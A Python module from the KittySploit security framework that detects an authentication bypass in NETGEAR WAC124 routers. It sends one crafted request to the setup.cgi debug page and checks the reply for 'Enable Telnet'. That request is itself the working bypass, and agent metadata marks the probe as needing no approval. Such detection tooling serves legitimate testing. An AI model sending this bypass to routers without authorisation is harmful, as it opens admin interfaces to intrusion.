#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR WAC124 - Authentication Bypass Detection',
        'description': 'NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability. An attacker can gain access by bypassing proper authentication, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'netgear', 'auth-bypass', 'router', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://flattsecurity.medium.com/finding-bugs-to-trigger-unauthenticated-command-injection-in-a-netgear-router-psv-2022-0044-2b394fb9edc',
            'https://kb.netgear.com/000064730/Security-Advisory-for-Multiple-Vulnerabilities-on-the-WAC124-PSV-2022-0044',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/setup.cgi?next_file=debug.htm&x=currentsetting.htm', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Enable Telnet',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="NETGEAR WAC124 - Authentication Bypass detected",
                path='/setup.cgi?next_file=debug.htm&x=currentsetting.htm',
            )
            return True
        return False

